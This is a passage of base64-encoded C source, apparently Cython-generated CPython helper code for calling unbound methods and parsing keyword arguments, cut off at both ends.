ZW5kaWZcbiAgICB0YXJnZXQtPm1ldGhvZCA9IHJlc3VsdDtcbiAgICByZXR1cm4gMDtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZzEsIFB5T2JqZWN0ICphcmcyKSB7XG4gICAgaW50IHdhc19pbml0aWFsaXplZCA9IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpO1xuICAgIGlmIChsaWtlbHkod2FzX2luaXRpYWxpemVkID09IDIgJiYgY2Z1bmMtPmZ1bmMpKSB7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge2FyZzEsIGFyZzJ9O1xuICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gTUVUSF9GQVNUQ0FMTCkge1xuICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBhcmdzLCAyKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gKE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTKSlcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgMiwgTlVMTCk7XG4gICAgfVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgZWxzZSBpZiAodW5saWtlbHkod2FzX2luaXRpYWxpemVkID09IDEpKSB7XG4gICAgICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbiB0bXBfY2Z1bmMgPSB7XG4jaWZuZGVmIF9fY3BsdXNwbHVzXG4gICAgICAgICAgICAwXG4jZW5kaWZcbiAgICAgICAgfTtcbiAgICAgICAgdG1wX2NmdW5jLnR5cGUgPSBjZnVuYy0+dHlwZTtcbiAgICAgICAgdG1wX2NmdW5jLm1ldGhvZF9uYW1lID0gY2Z1bmMtPm1ldGhvZF9uYW1lO1xuICAgICAgICByZXR1cm4gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoJnRtcF9jZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7XG4gICAgfVxuI2VuZGlmXG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKTtcbiAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uKiBjZnVuYywgUHlPYmplY3QqIHNlbGYsIFB5T2JqZWN0KiBhcmcxLCBQeU9iamVjdCogYXJnMil7XG4gICAgaWYgKHVubGlrZWx5KCFjZnVuYy0+ZnVuYyAmJiAhY2Z1bmMtPm1ldGhvZCkgJiYgdW5saWtlbHkoX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRob2QoY2Z1bmMpIDwgMCkpIHJldHVybiBOVUxMO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIGlmIChjZnVuYy0+ZnVuYyAmJiAoY2Z1bmMtPmZsYWcgJiBNRVRIX1ZBUkFSR1MpKSB7XG4gICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMO1xuICAgICAgICBQeU9iamVjdCAqYXJncyA9IFB5VHVwbGVfTmV3KDIpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWFyZ3MpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgUHlfSU5DUkVGKGFyZzEpO1xuICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDAsIGFyZzEpO1xuICAgICAgICBQeV9JTkNSRUYoYXJnMik7XG4gICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMSwgYXJnMik7XG4gICAgICAgIGlmIChjZnVuYy0+ZmxhZyAmIE1FVEhfS0VZV09SRFMpXG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9DYWxsQ0Z1bmN0aW9uV2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCBOVUxMKTtcbiAgICAgICAgZWxzZVxuICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbihjZnVuYywgc2VsZiwgYXJncyk7XG4gICAgICAgIFB5X0RFQ1JFRihhcmdzKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzWzRdID0ge05VTEwsIHNlbGYsIGFyZzEsIGFyZzJ9O1xuICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoY2Z1bmMtPm1ldGhvZCwgYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbiAgICB9XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3MoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUpXG57XG4gICAgUHlPYmplY3QgKiogY29uc3QgKm5hbWUgPSBhcmduYW1lcztcbiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHtcbiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTtcbiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0NvbnRhaW5zKGt3ZHMsIGtleSk7XG4gICAgICAgIGlmICh1bmxpa2VseShmb3VuZCkpIHtcbiAgICAgICAgICAgIGlmIChmb3VuZCA9PSAxKSBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5iYWQ6XG4gICAgcmV0dXJuIC0xO1xufVxuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChQeU9iamVjdCAqczEsIFB5T2JqZWN0ICpzMikge1xuICAgIGludCBraW5kO1xuICAgIFB5X3NzaXplX3QgbGVuID0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczEpO1xuICAgIGlmIChsZW4gIT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpKSByZXR1cm4gMDtcbiAgICBraW5kID0gUHlVbmljb2RlX0tJTkQoczEpO1xuICAgIGlmIChraW5kICE9IFB5VW5pY29kZV9LSU5EKHMyKSkgcmV0dXJuIDA7XG4gICAgY29uc3Qgdm9pZCAqZGF0YTEgPSBQeVVuaWNvZGVfREFUQShzMSk7XG4gICAgY29uc3Qgdm9pZCAqZGF0YTIgPSBQeVVuaWNvZGVfREFUQShzMik7XG4gICAgcmV0dXJuIChtZW1jbXAoZGF0YTEsIGRhdGEyLCAoc2l6ZV90KSBsZW4gKiAoc2l6ZV90KSBraW5kKSA9PSAwKTtcbn1cbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKFxuICAgIFB5T2JqZWN0ICprZXksXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIHNpemVfdCAqaW5kZXhfZm91bmQsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTtcbiAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgIFB5X2hhc2hfdCBrZXlfaGFzaCA9ICgoUHlBU0NJSU9iamVjdCopa2V5KS0+aGFzaDtcbiAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKSB7XG4gICAgICAgIGtleV9oYXNoID0gUHlPYmplY3RfSGFzaChrZXkpO1xuICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgd2hpbGUgKCpuYW1lKSB7XG4gICAgICAgIFB5T2JqZWN0ICpuYW1lX3N0ciA9ICoqbmFtZTtcbiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgICAgICAgaWYgKGtleV9oYXNoID09ICgoUHlBU0NJSU9iamVjdCopbmFtZV9zdHIpLT5oYXNoICYmIF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKG5hbWVfc3RyLCBrZXkpKSB7XG4gICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAoUHlVbmljb2RlX0dFVF9MRU5HVEgobmFtZV9zdHIpID09IFB5VW5pY29kZV9HRVRfTEVOR1RIKGtleSkpXG4gICAgICAgICNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICBpbnQgY21wID0gUHlVbmljb2RlX0NvbXBhcmUobmFtZV9zdHIsIGtleSk7XG4gICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7XG4gICAgICAgICAgICBpZiAoY21wID09IDApIHtcbiAgICAgICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICBuYW1lID0gYXJnbmFtZXM7XG4gICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7XG4gICAgICAgIFB5T2JqZWN0ICpuYW1lX3N0ciA9ICoqbmFtZTtcbiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09ICgoUHlBU0NJSU9iamVjdCopbmFtZV9zdHIpLT5oYXNoKSkge1xuICAgICAgICAgICAgaWYgKF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKG5hbWVfc3RyLCBrZXkpKVxuICAgICAgICAgICAgICAgIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTtcbiAgICAgICAgfVxuICAgICAgICAjZWxzZVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKVxuICAgICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KG5hbWVfc3RyID09IGtleSkpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTtcbiAgICAgICAgICAgIGludCBjbXAgPSBQeVVuaWNvZGVfQ29tcGFyZShuYW1lX3N0ciwga2V5KTtcbiAgICAgICAgICAgIGlmIChjbXAgPCAwICYmIHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYXJnX3Bhc3NlZF90d2ljZTpcbiAgICBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICBnb3RvIGJhZDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cihcbiAgICBQeU9iamVjdCAqa2V5LFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBzaXplX3QgKmluZGV4X2ZvdW5kLFxuICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpXG57XG4gICAgUHlPYmplY3QgKiogY29uc3QgKm5hbWU7XG4gICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIGdvdG8gaW52YWxpZF9rZXl3b3JkX3R5cGU7XG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUpIHtcbiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpO1xuICAgICAgICBpZiAoY21wID09IDEpIHtcbiAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpO1xuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KGNtcCA9PSAtMSkpIGdvdG8gYmFkO1xuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIG5hbWUgPSBhcmduYW1lcztcbiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHtcbiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpO1xuICAgICAgICBpZiAodW5saWtlbHkoY21wICE9IDApKSB7XG4gICAgICAgICAgICBpZiAoY21wID09IDEpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTtcbiAgICAgICAgICAgIGVsc2UgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbmFyZ19wYXNzZWRfdHdpY2U6XG4gICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7XG4gICAgZ290byBiYWQ7XG5pbnZhbGlkX2tleXdvcmRfdHlwZTpcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJS4yMDBzKCkga2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIiwgZnVuY3Rpb25fbmFtZSk7XG4gICAgZ290byBiYWQ7XG5iYWQ6XG4gICAgcmV0dXJuIC0xO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZyhcbiAgICBQeU9iamVjdCAqa2V5LFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBzaXplX3QgKmluZGV4X2ZvdW5kLFxuICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpXG57XG4gICAgcmV0dXJuIGxpa2VseShQeVVuaWNvZGVfQ2hlY2tFeGFjdChrZXkpKSA/XG4gICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSkgOlxuICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfbm9zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9SZWplY3RVbmtub3duS2V5d29yZChcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeV9zc2l6ZV90IHBvcyA9IDA7XG4gICAgUHlPYmplY3QgKmtleSA9IE5VTEw7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihrd2RzKTtcbiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3dkcywgJnBvcywgJmtleSwgTlVMTCkpIHtcbiAgICAgICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICAgICAgd2hpbGUgKCpuYW1lICYmICgqKm5hbWUgIT0ga2V5KSkgbmFtZSsrO1xuICAgICAgICBpZiAoISpuYW1lKSB7XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgIFB5X0lOQ1JFRihrZXkpO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwO1xuICAgICAgICAgICAgaW50IGNtcCA9IF9fUHl4X01hdGNoS2V5d29yZEFyZyhrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsICZpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7XG4gICAgICAgICAgICBpZiAoY21wICE9IDEpIHtcbiAgICAgICAgICAgICAgICBpZiAoY21wID09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgXCclVVwnIixcbiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgYXNzZXJ0KFB5RXJyX09jY3VycmVkKCkpO1xufVxuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0KFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIFB5X3NzaXplX3QgbnVtX2t3YXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lLFxuICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpXG57XG4gICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTtcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJncztcbiAgICBQeV9zc2l6ZV90IGV4dHJhY3RlZCA9IDA7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBkZWZpbmVkKFB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cylcbiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTtcbiNlbmRpZlxuICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgd2hpbGUgKCpuYW1lICYmIG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHtcbiAgICAgICAgUHlPYmplY3QgKiBrZXkgPSAqKm5hbWU7XG4gICAgICAgIFB5T2JqZWN0ICp2YWx1ZTtcbiAgICAgICAgaW50IGZvdW5kID0gMDtcbiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMsIGtleSwgJnZhbHVlKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgdmFsdWUgPSBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcihrd2RzLCBrZXkpO1xuICAgICAgICBpZiAodmFsdWUpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgICAgICAgICBmb3VuZCA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoZm91bmQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShmb3VuZCA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlO1xuICAgICAgICAgICAgZXh0cmFjdGVkKys7XG4gICAgICAgIH1cbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICBpZiAobnVtX2t3YXJncyA+IGV4dHJhY3RlZCkge1xuICAgICAgICBpZiAoaWdub3JlX3Vua25vd25fa3dhcmdzKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfVmFsaWRhdGVEdXBsaWNhdGVQb3NBcmdzKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpID09IC0xKSlcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIF9fUHl4X1JlamVjdFVua25vd25LZXl3b3JkKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpO1xuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIDA7XG5iYWQ6XG4gICAgcmV0dXJuIC0xO1xufVxuc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKVxue1xuICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWU7XG4gICAgUHlPYmplY3QqKiBjb25zdCAqZmlyc3Rfa3dfYXJnID0gYXJnbmFtZXMgKyBudW1fcG9zX2FyZ3M7XG4gICAgUHlfc3NpemVfdCBsZW47XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBkZWZpbmVkKFB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cylcbiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTtcbiNlbmRpZlxuICAgIGlmIChQeURpY3RfVXBkYXRlKGt3ZHMyLCBrd2RzKSA8IDApIGdvdG8gYmFkO1xuICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgd2hpbGUgKCpuYW1lKSB7XG4gICAgICAgIFB5T2JqZWN0ICprZXkgPSAqKm5hbWU7XG4gICAgICAgIFB5T2JqZWN0ICp2YWx1ZTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBMiB8fCBkZWZpbmVkKFB5RGljdF9Qb3ApKVxuICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfUG9wKGt3ZHMyLCBrZXksICZ2YWx1ZSk7XG4gICAgICAgIGlmIChmb3VuZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgIH1cbiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfR2V0SXRlbVJlZihrd2RzMiwga2V5LCAmdmFsdWUpO1xuICAgICAgICBpZiAoZm91bmQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShmb3VuZCA8IDApKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9EZWxJdGVtKGt3ZHMyLCBrZXkpIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICB9XG4jZWxzZVxuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgdmFsdWUgPSBfUHlEaWN0X1BvcChrd2RzMiwga2V5LCBrd2RzMik7XG4gICAgI2Vsc2VcbiAgICAgICAgdmFsdWUgPSBfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcCwga3dkczIsIGtleSwga3dkczIpO1xuICAgICNlbmRpZlxuICAgICAgICBpZiAodmFsdWUgPT0ga3dkczIpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTtcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgbGVuID0gUHlEaWN0X1NpemUoa3dkczIpO1xuICAgIGlmIChsZW4gPiAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShsZW4gPT0gLTEpKSB7XG4gICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZShcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqIGNvbnN0ICprd3ZhbHVlcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICprd2RzMixcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncylcbntcbiAgICBQeU9iamVjdCAqa2V5ID0gTlVMTDtcbiAgICBQeU9iamVjdCoqIGNvbnN0ICogbmFtZTtcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hc